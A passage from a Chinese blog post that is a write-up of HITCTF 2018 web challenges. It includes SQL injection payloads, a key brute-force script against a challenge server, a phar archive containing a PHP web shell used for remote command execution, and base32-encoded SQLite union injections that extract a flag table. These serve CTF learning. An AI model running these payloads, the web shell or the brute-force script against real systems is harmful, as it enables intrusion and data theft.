class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use test;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; describe test;</span><br><span class="line">+-------+--------------+------+-----+---------+-------+</span><br><span class="line">| Field | Type         | Null | Key | Default | Extra |</span><br><span class="line">+-------+--------------+------+-----+---------+-------+</span><br><span class="line">| id    | int(11)      | NO   | PRI | NULL    |       |</span><br><span class="line">| phone | varchar(255) | YES  |     | NULL    |       |</span><br><span class="line">+-------+--------------+------+-----+---------+-------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test;</span><br><span class="line">+----+---------+</span><br><span class="line">| id | phone   |</span><br><span class="line">+----+---------+</span><br><span class="line">|  1 | &apos; or 1# |</span><br><span class="line">+----+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id,phone from test where id=0 or 1 group by id,phone with rollup;</span><br><span class="line">+----+---------+</span><br><span class="line">| id | phone   |</span><br><span class="line">+----+---------+</span><br><span class="line">|  1 | &apos; or 1# |</span><br><span class="line">|  1 | NULL    |</span><br><span class="line">| NULL | NULL    |</span><br><span class="line">+----+---------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id,phone from test where id=0 or 1 group by id with rollup;</span><br><span class="line">+----+---------+</span><br><span class="line">| id | phone   |</span><br><span class="line">+----+---------+</span><br><span class="line">|  1 | &apos; or 1# |</span><br><span class="line">| NULL | &apos; or 1# |</span><br><span class="line">+----+---------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id,phone from test where id=0 or 1 group by phone with rollup;</span><br><span class="line">+----+---------+</span><br><span class="line">| id | phone   |</span><br><span class="line">+----+---------+</span><br><span class="line">|  1 | &apos; or 1# |</span><br><span class="line">|  1 | NULL    |</span><br><span class="line">+----+---------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id,phone from test where id=0 or 1 group by phone with rollup having phone is null;</span><br><span class="line">+----+-------+</span><br><span class="line">| id | phone |</span><br><span class="line">+----+-------+</span><br><span class="line">|  1 | NULL  |</span><br><span class="line">+----+-------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="小电影"><a href="#小电影" class="headerlink" title="小电影"></a>小电影</h3><p><img src="http://upload-images.jianshu.io/upload_images/6949366-fa09e3a241b5f5c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="小电影"></p>
+<p>ffmpeg的漏洞<a href="http://www.freebuf.com/column/142775.html" target="_blank" rel="noopener">http://www.freebuf.com/column/142775.html</a><br>exp : <a href="https://github.com/neex/ffmpeg-avi-m3u-xbin" target="_blank" rel="noopener">https://github.com/neex/ffmpeg-avi-m3u-xbin</a><br>根据html源码提示利用exp去读flag文件即可</p>
+<h3 id="SecurePY"><a href="#SecurePY" class="headerlink" title="SecurePY"></a>SecurePY</h3><p><img src="http://upload-images.jianshu.io/upload_images/6949366-10bab2f44945d24d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="SecurePY"></p>
+<p>hint说python的缓存,并且给了uwsgi的配置项</p>
+<p>在<a href="http://123.206.83.157:8000/__pycache__/app.cpython-35.pyc" target="_blank" rel="noopener">http://123.206.83.157:8000/__pycache__/app.cpython-35.pyc</a>下载源码,源码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag_key = os.environ[<span class="string">'KEY'</span>]</span><br><span class="line">flag_enc = <span class="string">'9cf742955633f38d9c628bc9a9f98db042c6e4273a99944bc4cd150a0f7b9f317f52030329729ccf80798690667a0add'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, flag_enc = flag_enc)</span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">'/'</span>)(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    req = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="literal">None</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="literal">False</span>)</span><br><span class="line">    key = req[<span class="string">'key'</span>]</span><br><span class="line">    <span class="keyword">if</span> len(key) != len(flag_key):</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(key, flag_key):</span><br><span class="line">        <span class="keyword">if</span> ord(x) ^ ord(y):</span><br><span class="line">            <span class="keyword">return</span> jsonify(result = <span class="literal">False</span>)</span><br><span class="line">    cryptor = AES.new(key, AES.MODE_CBC, <span class="string">b'0000000000000000'</span>)</span><br><span class="line">    plain_text = cryptor.decrypt(a2b_hex(flag_enc))</span><br><span class="line">    flag = plain_text.decode(<span class="string">'utf-8'</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> jsonify(result = <span class="literal">True</span>, flag = flag)</span><br><span class="line"></span><br><span class="line">getflag = app.route(<span class="string">'/getflag'</span>, methods = [</span><br><span class="line">    <span class="string">'POST'</span>])(getflag)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>首先flag是经过AES加密的,我们需要找到key去解密,而且我们得先知道key的长度(在这里很明显是16位),然后题目有一处逐位比较的地方,<code>ord(x) ^ ord(y)</code>,通过这个地方我们能一位位构造爆破,但是问题是我们如何区别爆破成功和爆破失败?</li>
+<li>这里涉及到python的序列化json后转换的对象问题,<a href="https://docs.python.org/3/library/json.html#encoders-and-decoders" target="_blank" rel="noopener">https://docs.python.org/3/library/json.html#encoders-and-decoders</a><br>如果遇到null就会被转换成None,遇到ord(None)的时候python就会抛出错误<img src="http://upload-images.jianshu.io/upload_images/6949366-075ca45cc900e15d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="error">尝试一下<img src="http://upload-images.jianshu.io/upload_images/6949366-8419cc47d357f2be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="500 error"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-2ddb11dcb5173ff5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="return false"><br>这样的话我们就能够根据是否500来爆破我们需要的key了<br>爆破脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">se = requests.Session()</span><br><span class="line"></span><br><span class="line">key = [<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>]</span><br><span class="line">realkey = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        key[x] = str(chr(y))</span><br><span class="line">        test = &#123;<span class="string">"key"</span> : key&#125;</span><br><span class="line">        res = se.post(<span class="string">'http://123.206.83.157:8000/getflag'</span>,json=test)</span><br><span class="line">        <span class="comment"># print res.content</span></span><br><span class="line">        <span class="comment"># exit()</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'500'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            <span class="keyword">print</span> str(chr(y))</span><br><span class="line">            realkey += str(chr(y))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> realkey</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>得到key : <code>5ecur3pPYpyPYk3y</code><br>提交之后得到flag</p>
+<p>参考:<a href="https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/</a></p>
+<h3 id="BabyWrite"><a href="#BabyWrite" class="headerlink" title="BabyWrite"></a>BabyWrite</h3><p><img src="http://upload-images.jianshu.io/upload_images/6949366-a28936abd759c540.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="BabyWrite"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-d979ab76e3f5ea9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="index.php"></p>
+<ul>
+<li><p>一看到这个url就想到了这个login很有可能是login.php被包含进来的, 遂直接访问login.php发现是可以的,所以直接用伪协议读取文件内容<br><img src="http://upload-images.jianshu.io/upload_images/6949366-78d8a69888acffa5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="php wrapper"><br>源码如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CTF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    ç»éè§£éæ´å¤åè½</span><br><span class="line">    &lt;form action=<span class="string">"login.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        ç¨æ·å : &lt;input name=<span class="string">"username"</span> placeholder=<span class="string">"username"</span>&gt;&lt;br/&gt;</span><br><span class="line">        å¯ç  : &lt;input name=<span class="string">"password"</span> placeholder=<span class="string">"password"</span>&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> value=<span class="string">"ç»é"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">        $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">        <span class="keyword">if</span> ($username === <span class="string">"admin"</span> &amp;&amp; sha1(md5($password)) === $admin_hash)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login seccess!");&lt;/script&gt;'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span>($_GET[<span class="string">'debug'</span>] === <span class="string">'hitctf'</span>)&#123;</span><br><span class="line">                    $logfile = <span class="string">"log/"</span>.$username.<span class="string">".log"</span>;</span><br><span class="line">                    $content = $username.<span class="string">" =&gt; "</span>.$password;</span><br><span class="line">                    file_put_contents($logfile, $content);</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Please input username and password!");&lt;/script&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>从源码我们可以知道就算我们不登录也没有啥问题,提交debug参数之后可以任意写入文件内容到log后缀的文件中,这里限定死了后缀,也就是无法直接用文件包含getShell(此题包含时后缀要求是php),但是可以利用zip和phar伪协议包含,但是这里有个问题, 题目会在文件前加上 username =&gt; password ,这样的字符串有可能会破坏文件格式导致解压失败. 一叶飘零大佬是直接构造出了zip,<a href="http://skysec.top/2018/02/01/HITCTF-WEB%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">http://skysec.top/2018/02/01/HITCTF-WEB%E9%A2%98%E8%A7%A3/</a><br>其实用phar也可以做, 并且不用顾及格式问题,因为phar在解压的时候先寻找stub部分,也就是<?php ?>标签内的内容(会将前面的忽略),所以只要stub结构完整就ok了</p>
+</li>
+<li><p>构造phar</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'Pr0ph3t.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p[<span class="string">'shit.php'</span>] = <span class="string">'&lt;?php system($_GET[\'uuu\']); ?&gt;'</span>;</span><br><span class="line">$p-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>写入log<br>post username为Pr0ph3t、password为生成的phar内容到<code>http://120.24.215.80:10012/?page=login&amp;debug=hitctf</code><br>但是这里并不能直接用phar伪协议去包含,因为phar文件被修改过了,所以sha1签名对应不上,不会被解压 所以下一步是修改文件sha1</p>
+</li>
+<li><p>下载被修改的log<br>访问<code>http://120.24.215.80:10012/log/Pr0ph3t.log</code>得到被修改后的phar文件<img src="http://upload-images.jianshu.io/upload_images/6949366-54e7137de9f74c04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="被修改之后的phar文件"><br>其中被选中部分是这个phar的sha1签名(<a href="http://php.net/manual/en/phar.fileformat.phar.php" target="_blank" rel="noopener">http://php.net/manual/en/phar.fileformat.phar.php</a>)</p>
+</li>
+<li><p>计算新sha1并更改上传新phar<br><img src="http://upload-images.jianshu.io/upload_images/6949366-22eaa961ca5c2650.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="旧phar"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-d696d36dd8f138b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="被修改之后的phar(除去校验部分)"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-a05457fd5bbf98fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="计算新sha1"><br>更改刚才的选中部分<br><img src="http://upload-images.jianshu.io/upload_images/6949366-2ce0621724e33fa9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="新phar"><br>然后再次写入新phar到log</p>
+</li>
+<li><p>getShell<br><img src="http://upload-images.jianshu.io/upload_images/6949366-7b15abb40f5d6f50.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="getShell"></p>
+</li>
+<li><p>flag在根目录下</p>
+</li>
+</ul>
+<h3 id="BabyQuery"><a href="#BabyQuery" class="headerlink" title="BabyQuery"></a>BabyQuery</h3><p><img src="http://upload-images.jianshu.io/upload_images/6949366-efbb02face8b1907.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="BabyQuery"></p>
+<ul>
+<li>一个关于GraphQL的注入<br>GraphQL的介绍<a href="http://graphql.cn/" target="_blank" rel="noopener">http://graphql.cn/</a><br>简单来说GraphQL就是一种介于数据库和客户端的一种类似于api的查询语言,客户并不直接告诉数据库需要的数据,而是GraphQL来告诉数据库客户需要什么数据,极大的避免了注入</li>
+<li>但是这题用GraphQL的时候没有很好的过滤完全</li>
+<li>首先getscorebyid这个操作是没问题的 id字段的内容base32encode过的,并且限制一位,无法注入<img src="http://upload-images.jianshu.io/upload_images/6949366-a15084bd495d6402.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="base32"></li>
+<li>然后尝试看看有没有其他操作<img src="http://upload-images.jianshu.io/upload_images/6949366-df4c728cf652119d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="其他操作"></li>
+<li>有getscorebyyourname操作,猜测这个操作应该有name字段<img src="http://upload-images.jianshu.io/upload_images/6949366-dab440f466d7dcef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="不能查询id">这个操作不能查询id,去掉</li>
+<li>正常查询<img src="http://upload-images.jianshu.io/upload_images/6949366-edd3f5bef4d827ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="正常查询"></li>
+<li>尝试一下存不存在注入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Alice</span><br><span class="line">  ||</span><br><span class="line">IFWGSY3F (base32encode)</span><br><span class="line"></span><br><span class="line">Alice&apos; and 1 --+</span><br><span class="line">  ||</span><br><span class="line">IFWGSY3FE4QGC3TEEAYSALJNFM======</span><br><span class="line"></span><br><span class="line">Alice&apos; and 0 --+</span><br><span class="line">  ||</span><br><span class="line">IFWGSY3FE4QGC3TEEAYCALJNFM======</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/6949366-f17c4d11ee5aa782.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Alice&#39; and 1 --+"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-2ce92c3955b30af0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Alice&#39; and 0 --+">是存在注入的</p>
+<ul>
+<li>下一步就是判断数据库类型<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select version() --+</span><br><span class="line">  ||</span><br><span class="line">METSA5LONFXW4IDTMVWGKY3UEB3GK4TTNFXW4KBJEAWS2KY=</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/6949366-d67d84c59f04866d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="a&#39; union select version() --+"><br>不是mysql</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select sqlite_version() --+</span><br><span class="line">  ||</span><br><span class="line">METSA5LONFXW4IDTMVWGKY3UEBZXC3DJORSV65TFOJZWS33OFAUSALJNFM======</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://upload-images.jianshu.io/upload_images/6949366-b0fe211cfcdbc791.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="a&#39; union select sqlite_version() --+"><br>确认数据库为sqlite</p>
+<ul>
+<li>表<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select group_concat(name) from sqlite_master where type=&apos;table&apos; --+</span><br><span class="line">  ||</span><br><span class="line">METSA5LONFXW4IDTMVWGKY3UEBTXE33VOBPWG33OMNQXIKDOMFWWKKJAMZZG63JAONYWY2LUMVPW2YLTORSXEIDXNBSXEZJAOR4XAZJ5E52GCYTMMUTSALJNFM======</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/6949366-341b63f82a18e765.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="a&#39; union select group_concat(name) from sqlite_master where type=&#39;table&#39; --+"></p>
+<ul>
+<li>列<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select group_concat(sql) from sqlite_master where type=&apos;table&apos; and name=&apos;Secr3t_fl4g&apos;--+</span><br><span class="line">  ||</span><br><span class="line">METSA5LONFXW4IDTMVWGKY3UEBTXE33VOBPWG33OMNQXIKDTOFWCSIDGOJXW2IDTOFWGS5DFL5WWC43UMVZCA53IMVZGKIDUPFYGKPJHORQWE3DFE4QGC3TEEBXGC3LFHUTVGZLDOIZXIX3GNQ2GOJZNFUVQ====</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/6949366-3555c9c082a001a2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="a&#39; union select group_concat(sql) from sqlite_master where type=&#39;table&#39; and name=&#39;Secr3t_fl4g&#39;--+"></p>
+<ul>
+<li>getFlag<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select group_concat(flag) from Secr3t_fl4g --+</span><br><span class="line">  ||</span><br><span class="line">METSA5LONFXW4IDTMVWGKY3UEBTXE33VOBPWG33OMNQXIKDGNRQWOKJAMZZG63JAKNSWG4RTORPWM3BUM4QC2LJL</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/6949366-053cb81199efeee0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="getFlag"></p>
+<hr>
+<p>感觉自己越打越菜了….Orz………..</p>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/02/03/hitctf-Web-Writeup/">[hitctf] Web Writeup</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Pr0ph3t 的个人博客">Pr0ph3t</a></p>
+        <p><span>发布时间:</span>2018年02月03日 - 03时25分</p>
+        <p><span>最后更新:</span>2019年07月06日 - 17时55分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/02/03/hitctf-Web-Writeup/" title="[hitctf] Web Writeup">https://blog.pr0ph3t.com/2018/02/03/hitctf-Web-Writeup/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://blog.pr0ph3t.com/2018/02/03/hitctf-Web-Writeup/　　作者: Pr0ph3t" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2018/05/01/题目-记一次利用gopher的内网mysql盲注/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          [题目]记一次利用gopher的内网mysql盲注
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/01/26/hitcon2017-Baby-H-master-php-2017-复现/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">[hitcon2017] Baby^H-master-php-2017 复现</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-reading"><span class="toc-number">1.</span> <span class="toc-text">PHP reading</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabyEval"><span class="toc-number">2.</span> <span class="toc-text">BabyEval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabyLeakage"><span class="toc-number">3.</span> <span class="toc-text">BabyLeakage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabyInjection"><span class="toc-number">4.</span> <span class="toc-text">BabyInjection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#小电影"><span class="toc-number">5.</span> <span class="toc-text">小电影</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SecurePY"><span class="toc-number">6.</span> <span class="toc-text">SecurePY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabyWrite"><span class="toc-number">7.</span> <span class="toc-text">BabyWrite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabyQuery"><span class="toc-number">8.</span> <span class="toc-text">BabyQuery</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2018/05/01/题目-记一次利用gopher的内网mysql盲注/" title="上一篇: [题目]记一次利用gopher的内网mysql盲注">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
